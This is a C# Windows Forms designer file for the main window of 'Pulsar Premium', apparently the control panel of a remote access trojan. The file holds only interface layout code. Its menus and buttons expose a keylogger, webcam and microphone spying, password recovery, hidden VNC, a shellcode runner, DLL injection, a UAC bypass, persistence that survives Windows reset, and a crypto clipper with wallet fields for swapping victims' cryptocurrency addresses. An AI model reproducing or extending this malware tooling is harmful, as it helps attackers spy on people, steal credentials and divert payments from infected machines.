            showMessageBoxToolStripMenuItem1.Name = "showMessageBoxToolStripMenuItem1";
            showMessageBoxToolStripMenuItem1.Size = new Size(185, 22);
            showMessageBoxToolStripMenuItem1.Text = "Show Message Box";
            showMessageBoxToolStripMenuItem1.Click += showMessageBoxToolStripMenuItem1_Click;
            // 
            // excludeSystemDriveToolStripMenuItem
            // 
            excludeSystemDriveToolStripMenuItem.Image = Properties.Resources.uac_shield;
            excludeSystemDriveToolStripMenuItem.Name = "excludeSystemDriveToolStripMenuItem";
            excludeSystemDriveToolStripMenuItem.Size = new Size(185, 22);
            excludeSystemDriveToolStripMenuItem.Text = "Exclude System Drive";
            excludeSystemDriveToolStripMenuItem.Click += excludeSystemDriveToolStripMenuItem_Click;
            // 
            // winREToolStripMenuItem1
            // 
            winREToolStripMenuItem1.Image = Properties.Resources.anchor;
            winREToolStripMenuItem1.Name = "winREToolStripMenuItem1";
            winREToolStripMenuItem1.Size = new Size(185, 22);
            winREToolStripMenuItem1.Text = "WinRE";
            winREToolStripMenuItem1.Click += winREToolStripMenuItem1_Click;
            // 
            // deleteTasksToolStripMenuItem
            // 
            deleteTasksToolStripMenuItem.Image = Properties.Resources.delete;
            deleteTasksToolStripMenuItem.Name = "deleteTasksToolStripMenuItem";
            deleteTasksToolStripMenuItem.Size = new Size(138, 22);
            deleteTasksToolStripMenuItem.Text = "Delete Task&s";
            deleteTasksToolStripMenuItem.Click += deleteTasksToolStripMenuItem_Click;
            // 
            // statusStrip
            // 
            statusStrip.Dock = DockStyle.Fill;
            statusStrip.ImageScalingSize = new Size(24, 24);
            statusStrip.Items.AddRange(new ToolStripItem[] { listenToolStripStatusLabel, connectedToolStripStatusLabel });
            statusStrip.Location = new Point(0, 516);
            statusStrip.Name = "statusStrip";
            statusStrip.Size = new Size(1144, 22);
            statusStrip.SizingGrip = false;
            statusStrip.TabIndex = 3;
            statusStrip.Text = "statusStrip1";
            // 
            // listenToolStripStatusLabel
            // 
            listenToolStripStatusLabel.Image = Properties.Resources.bullet_red;
            listenToolStripStatusLabel.ImageScaling = ToolStripItemImageScaling.None;
            listenToolStripStatusLabel.ImageTransparentColor = Color.White;
            listenToolStripStatusLabel.Name = "listenToolStripStatusLabel";
            listenToolStripStatusLabel.Size = new Size(103, 17);
            listenToolStripStatusLabel.Text = "Listening: False";
            // 
            // connectedToolStripStatusLabel
            // 
            connectedToolStripStatusLabel.ForeColor = Color.Black;
            connectedToolStripStatusLabel.Image = Properties.Resources.status_online;
            connectedToolStripStatusLabel.ImageScaling = ToolStripItemImageScaling.None;
            connectedToolStripStatusLabel.ImageTransparentColor = Color.White;
            connectedToolStripStatusLabel.Name = "connectedToolStripStatusLabel";
            connectedToolStripStatusLabel.Size = new Size(93, 17);
            connectedToolStripStatusLabel.Text = "Connected: 0";
            // 
            // menuStrip
            // 
            menuStrip.BackColor = SystemColors.ButtonFace;
            menuStrip.Dock = DockStyle.Fill;
            menuStrip.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point, 0);
            menuStrip.ImageScalingSize = new Size(24, 24);
            menuStrip.Items.AddRange(new ToolStripItem[] { clientsToolStripMenuItem, offlineClientsToolStripMenuItem, statsToolStripMenuItem, mapToolStripMenuItem, autoTasksToolStripMenuItem, cryptoClipperToolStripMenuItem, notificationCentreToolStripMenuItem, pluginManagerToolStripMenuItem, aboutToolStripMenuItem, settingsToolStripMenuItem, builderToolStripMenuItem });
            menuStrip.Location = new Point(0, 0);
            menuStrip.Name = "menuStrip";
            menuStrip.Size = new Size(1144, 25);
            menuStrip.TabIndex = 2;
            // 
            // clientsToolStripMenuItem
            // 
            clientsToolStripMenuItem.Image = Properties.Resources.user;
            clientsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            clientsToolStripMenuItem.Name = "clientsToolStripMenuItem";
            clientsToolStripMenuItem.Size = new Size(71, 21);
            clientsToolStripMenuItem.Text = "Clients";
            clientsToolStripMenuItem.Click += clientsToolStripMenuItem_Click;
            // 
            // offlineClientsToolStripMenuItem
            // 
            offlineClientsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { clearOfflineClientsToolStripMenuItem });
            offlineClientsToolStripMenuItem.Image = Properties.Resources.disconnect;
            offlineClientsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            offlineClientsToolStripMenuItem.Name = "offlineClientsToolStripMenuItem";
            offlineClientsToolStripMenuItem.Size = new Size(110, 21);
            offlineClientsToolStripMenuItem.Text = "Offline Clients";
            offlineClientsToolStripMenuItem.Click += offlineClientsToolStripMenuItem_Click;
            // 
            // clearOfflineClientsToolStripMenuItem
            // 
            clearOfflineClientsToolStripMenuItem.Name = "clearOfflineClientsToolStripMenuItem";
            clearOfflineClientsToolStripMenuItem.Size = new Size(122, 22);
            clearOfflineClientsToolStripMenuItem.Text = "Clear List";
            clearOfflineClientsToolStripMenuItem.Click += clearOfflineClientsToolStripMenuItem_Click;
            // 
            // statsToolStripMenuItem
            // 
            statsToolStripMenuItem.Image = Properties.Resources.chart_curve;
            statsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            statsToolStripMenuItem.Name = "statsToolStripMenuItem";
            statsToolStripMenuItem.Size = new Size(60, 21);
            statsToolStripMenuItem.Text = "Stats";
            statsToolStripMenuItem.Click += statsToolStripMenuItem_Click;
            // 
            // mapToolStripMenuItem
            // 
            mapToolStripMenuItem.Image = Properties.Resources.map;
            mapToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            mapToolStripMenuItem.Name = "mapToolStripMenuItem";
            mapToolStripMenuItem.Size = new Size(59, 21);
            mapToolStripMenuItem.Text = "Map";
            mapToolStripMenuItem.Click += mapToolStripMenuItem_Click;
            // 
            // autoTasksToolStripMenuItem
            // 
            autoTasksToolStripMenuItem.Image = Properties.Resources.server;
            autoTasksToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            autoTasksToolStripMenuItem.Name = "autoTasksToolStripMenuItem";
            autoTasksToolStripMenuItem.Size = new Size(92, 21);
            autoTasksToolStripMenuItem.Text = "Auto Tasks";
            autoTasksToolStripMenuItem.Click += autoTasksToolStripMenuItem_Click;
            // 
            // cryptoClipperToolStripMenuItem
            // 
            cryptoClipperToolStripMenuItem.Image = Properties.Resources.money_dollar;
            cryptoClipperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            cryptoClipperToolStripMenuItem.Name = "cryptoClipperToolStripMenuItem";
            cryptoClipperToolStripMenuItem.Size = new Size(112, 21);
            cryptoClipperToolStripMenuItem.Text = "Crypto Clipper";
            cryptoClipperToolStripMenuItem.Click += cryptoClipperToolStripMenuItem_Click;
            // 
            // notificationCentreToolStripMenuItem
            // 
            notificationCentreToolStripMenuItem.Image = Properties.Resources.bell;
            notificationCentreToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            notificationCentreToolStripMenuItem.Name = "notificationCentreToolStripMenuItem";
            notificationCentreToolStripMenuItem.Size = new Size(136, 21);
            notificationCentreToolStripMenuItem.Text = "Notification Center";
            notificationCentreToolStripMenuItem.Click += notificationCentreToolStripMenuItem_Click;
            // 
            // aboutToolStripMenuItem
            // 
            aboutToolStripMenuItem.Alignment = ToolStripItemAlignment.Right;
            aboutToolStripMenuItem.ForeColor = Color.Black;
            aboutToolStripMenuItem.Image = Properties.Resources.information;
            aboutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
            aboutToolStripMenuItem.Size = new Size(68, 21);
            aboutToolStripMenuItem.Text = "About";
            aboutToolStripMenuItem.Click += aboutToolStripMenuItem_Click;
            // 
            // settingsToolStripMenuItem
            // 
            settingsToolStripMenuItem.Alignment = ToolStripItemAlignment.Right;
            settingsToolStripMenuItem.ForeColor = Color.Black;
            settingsToolStripMenuItem.Image = Properties.Resources.cog;
            settingsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
            settingsToolStripMenuItem.Size = new Size(77, 21);
            settingsToolStripMenuItem.Text = "Settings";
            settingsToolStripMenuItem.Click += settingsToolStripMenuItem_Click;
            // 
            // builderToolStripMenuItem
            // 
            builderToolStripMenuItem.Alignment = ToolStripItemAlignment.Right;
            builderToolStripMenuItem.ForeColor = Color.Black;
            builderToolStripMenuItem.Image = Properties.Resources.bricks;
            builderToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            builderToolStripMenuItem.Name = "builderToolStripMenuItem";
            builderToolStripMenuItem.Size = new Size(72, 21);
            builderToolStripMenuItem.Text = "Builder";
            builderToolStripMenuItem.Click += builderToolStripMenuItem_Click;
            // 
            // FrmMain
            // 
            AutoScaleDimensions = new SizeF(96F, 96F);
            AutoScaleMode = AutoScaleMode.Dpi;
            ClientSize = new Size(1144, 538);
            Controls.Add(tableLayoutPanel);
            Font = new Font("Segoe UI", 8.25F, FontStyle.Regular, GraphicsUnit.Point, 0);
            ForeColor = Color.Black;
            Icon = (Icon)resources.GetObject("$this.Icon");
            MinimumSize = new Size(680, 415);
            Name = "FrmMain";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Pulsar Premium - Connected: 0";
            FormClosing += FrmMain_FormClosing;
            Load += FrmMain_Load;
            contextMenuStrip.ResumeLayout(false);
            tableLayoutPanel.ResumeLayout(false);
            tableLayoutPanel.PerformLayout();
            MainTabControl.ResumeLayout(false);
            tabOfflineClients.ResumeLayout(false);
            OfflineClientsContextMenuStrip.ResumeLayout(false);
            tabStats.ResumeLayout(false);
            tabPage1.ResumeLayout(false);
            tableLayoutPanel1.ResumeLayout(false);
            tableLayoutPanel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBoxMain).EndInit();
            tblLayoutQuickButtons.ResumeLayout(false);
            tblLayoutQuickButtons.PerformLayout();
            gBoxClientInfo.ResumeLayout(false);
            DebugContextMenuStrip.ResumeLayout(false);
            tabHeatMap.ResumeLayout(false);
            tabPage2.ResumeLayout(false);
            NotificationContextMenuStrip.ResumeLayout(false);
            notificationStatusPanel.ResumeLayout(false);
            notificationStatusPanel.PerformLayout();
            tabPage3.ResumeLayout(false);
            tabPage3.PerformLayout();
            cryptoGroupBox.ResumeLayout(false);
            cryptoGroupBox.PerformLayout();
            tabPage4.ResumeLayout(false);
            TasksContextMenuStrip.ResumeLayout(false);
            statusStrip.ResumeLayout(false);
            statusStrip.PerformLayout();
            menuStrip.ResumeLayout(false);
            menuStrip.PerformLayout();
            ResumeLayout(false);
        }

        #endregion
        public System.Windows.Forms.ContextMenuStrip contextMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem connectionToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reconnectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
        private System.Windows.Forms.ImageList imgFlags;
        private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uninstallToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem surveillanceToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem taskManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem systemInformationToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem updateToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteShellToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator ctxtLine;
        private System.Windows.Forms.ToolStripMenuItem actionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem shutdownToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restartToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem standbyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startupManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keyloggerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
        private System.Windows.Forms.NotifyIcon notifyIcon;
        private System.Windows.Forms.ToolStripSeparator lineToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem selectAllToolStripMenuItem;
        private System.Windows.Forms.TableLayoutPanel tableLayoutPanel;
        private System.Windows.Forms.MenuStrip menuStrip;
        private System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem builderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
        public System.Windows.Forms.StatusStrip statusStrip;
        private System.Windows.Forms.ToolStripStatusLabel connectedToolStripStatusLabel;
        private System.Windows.Forms.ToolStripMenuItem connectionsToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem userSupportToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem showMessageboxToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem visitWebsiteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteExecuteToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem pluginManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem2;
        private ToolStripMenuItem funMethodsToolStripMenuItem;
        private ToolStripMenuItem bSODToolStripMenuItem;
        private ToolStripMenuItem cWToolStripMenuItem;
        private ToolStripMenuItem swapMouseButtonsToolStripMenuItem;
        private ToolStripMenuItem hVNCToolStripMenuItem;
        private ToolStripMenuItem webcamToolStripMenuItem;
        private ToolStripMenuItem hideTaskBarToolStripMenuItem;
        private ToolStripStatusLabel listenToolStripStatusLabel;
        private ToolStripMenuItem quickCommandsToolStripMenuItem;
        private ToolStripMenuItem addCDriveExceptionToolStripMenuItem;
        private ContextMenuStrip NotificationContextMenuStrip;
        private ToolStripMenuItem addKeywordsToolStripMenuItem;
        private ToolStripMenuItem clearSelectedToolStripMenuItem;
        private ToolStripMenuItem clientsToolStripMenuItem;
        private ToolStripMenuItem notificationCentreToolStripMenuItem;
        private ContextMenuStrip TasksContextMenuStrip;
        private ToolStripMenuItem addTaskToolStripMenuItem;
        private ToolStripMenuItem remoteExecuteToolStripMenuItem1;
        private ToolStripMenuItem shellCommandToolStripMenuItem;
        private ToolStripMenuItem kematianToolStripMenuItem;
        private ToolStripMenuItem showMessageBoxToolStripMenuItem1;
        private ToolStripMenuItem excludeSystemDriveToolStripMenuItem;
        private ToolStripMenuItem deleteTasksToolStripMenuItem;
        private ToolStripMenuItem autoTasksToolStripMenuItem;
        private ToolStripMenuItem cryptoClipperToolStripMenuItem;
        private ContextMenuStrip DebugContextMenuStrip;
        private ToolStripMenuItem saveLogsToolStripMenuItem;
        private ToolStripMenuItem saveSlectedToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripMenuItem clearLogsToolStripMenuItem;
        private ToolStripMenuItem nicknameToolStripMenuItem;
        private ToolStripMenuItem remoteScriptingToolStripMenuItem;
        private ToolStripMenuItem audioToolStripMenuItem;
        private ToolStripMenuItem elevatedToolStripMenuItem;
        private ToolStripMenuItem elevateClientPermissionsToolStripMenuItem;
        private ToolStripMenuItem elevateToSystemToolStripMenuItem;
        private ToolStripMenuItem deElevateFromSystemToolStripMenuItem;
        private ToolStripMenuItem blockIPToolStripMenuItem;
        private ToolStripMenuItem uACBypassToolStripMenuItem;
        private ToolStripMenuItem remoteChatToolStripMenuItem;
        private ToolStripMenuItem winREToolStripMenuItem;
        private ToolStripMenuItem installWinresetSurvivalToolStripMenuItem;
        private ToolStripMenuItem removeWinresetSurvivalToolStripMenuItem;
        private ToolStripMenuItem winREToolStripMenuItem1;
        private ToolStripMenuItem remoteSystemAudioToolStripMenuItem;
        private ToolStripMenuItem winRECustomFileForSurvivalToolStripMenuItem;
        private ToolStripMenuItem taskManagerToolStripMenuItem1;
        private ToolStripMenuItem enableToolStripMenuItem;
        private ToolStripMenuItem disableTaskManagerToolStripMenuItem;
        private NoButtonTabControl MainTabControl;
        private TabPage tabOfflineClients;
    private TabPage tabStats;
    private TabPage tabHeatMap;
        private AeroListView lstOfflineClients;
        private ColumnHeader hOfflineIP;
        private ColumnHeader hOfflineNickname;
        private ColumnHeader hOfflineTag;
        private ColumnHeader hOfflineUserPC;
        private ColumnHeader hOfflineVersion;
        private ColumnHeader hOfflineLastSeen;
        private ColumnHeader hOfflineFirstSeen;
        private ColumnHeader hOfflineCountry;
        private ColumnHeader hOfflineOS;
        private ColumnHeader hOfflineAccountType;
        private TabPage tabPage1;
    private AeroListView lstClients;
    private ClientsListElementHost wpfClientsHost;
        private StatsElementHost statsElementHost;
        private HeatMapElementHost heatMapElementHost;
        private ColumnHeader hIP;
        private ColumnHeader hNick;
        private ColumnHeader hTag;
        private ColumnHeader hUserPC;
        private ColumnHeader hVersion;
        private ColumnHeader hStatus;
        private ColumnHeader hCurrentWindow;
        private ColumnHeader hUserStatus;
        private ColumnHeader hCountry;
        private ColumnHeader hOS;
        private ColumnHeader hAccountType;
        private TableLayoutPanel tableLayoutPanel1;
        private Label label1;
        private PictureBox pictureBoxMain;
        private TableLayoutPanel tblLayoutQuickButtons;
        private Button btnQuickListenToMicrophone;
        private Button btnQuickRemoteDesktop;
        private Button btnQuickWebcam;
        private Button btnQuickKeylogger;
        private Button btnQuickFileTransfer;
        private Button btnQuickRemoteShell;
        private Button btnQuickFileExplorer;
        public CheckBox chkDisablePreview;
        private GroupBox gBoxClientInfo;
        private AeroListView clientInfoListView;
        private ColumnHeader Names;
        private ColumnHeader Stats;
        private RichTextBox DebugLogRichBox;
        private Splitter splitter1;
        private TabPage tabPage2;
        private AeroListView lstNoti;
    private Panel notificationStatusPanel;
    private Label lblNotificationStatus;
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private ColumnHeader columnHeader3;
        private ColumnHeader columnHeader11;
        private TabPage tabPage3;
        private GroupBox cryptoGroupBox;
        private TextBox BCHTextBox;
        private Label label10;
        private TextBox TRXTextBox;
        private Label label9;
        private TextBox XRPTextBox;
        private Label label8;
        private TextBox DASHTextBox;
        private Label label7;
        private TextBox SOLTextBox;
        private Label label6;
        private TextBox XMRTextBox;
        private Label label5;
        private TextBox LTCTextBox;
        private Label label4;
        private TextBox ETHTextBox;
        private Label label3;
        private TextBox BTCTextBox;
        private Label label2;
        public CheckBox ClipperCheckbox;
        private TabPage tabPage4;
        private AeroListView lstTasks;
        private ColumnHeader columnHeader4;
        private ColumnHeader columnHeader5;
        private ColumnHeader columnHeader8;
        private ToolStripMenuItem offlineClientsToolStripMenuItem;
        private ToolStripMenuItem clearOfflineClientsToolStripMenuItem;
        private ContextMenuStrip OfflineClientsContextMenuStrip;
        private ToolStripMenuItem removeOfflineClientsToolStripMenuItem;
        private ToolStripMenuItem statsToolStripMenuItem;
        private ToolStripMenuItem mapToolStripMenuItem;
        private ToolStripMenuItem uACToolStripMenuItem;
        private ToolStripMenuItem enableUACToolStripMenuItem;
        private ToolStripMenuItem disableUACToolStripMenuItem;
        private ToolStripMenuItem disableEnableKeyboardToolStripMenuItem;
        private ToolStripMenuItem startToolStripMenuItem;
        private ToolStripMenuItem stopToolStripMenuItem;
        private ToolStripMenuItem cDTrayToolStripMenuItem;
        private ToolStripMenuItem openToolStripMenuItem;
        private ToolStripMenuItem closeToolStripMenuItem;
        private ToolStripMenuItem monitorsToolStripMenuItem;
        private ToolStripMenuItem allOffToolStripMenuItem;
        private ToolStripMenuItem allOnToolStripMenuItem;
        private ToolStripMenuItem openClientFolderToolStripMenuItem;
        private ToolStripMenuItem shellcodeRunnerToolStripMenuItem;
        private ToolStripMenuItem injectDLLToolStripMenuItem;
        private ToolStripMenuItem virtualMonitorToolStripMenuItem1;
        private ToolStripMenuItem installToolStripMenuItem;
        private ToolStripMenuItem uninstallToolStripMenuItem1;
        private ToolStripMenuItem lockScreenToolStripMenuItem;
    }
}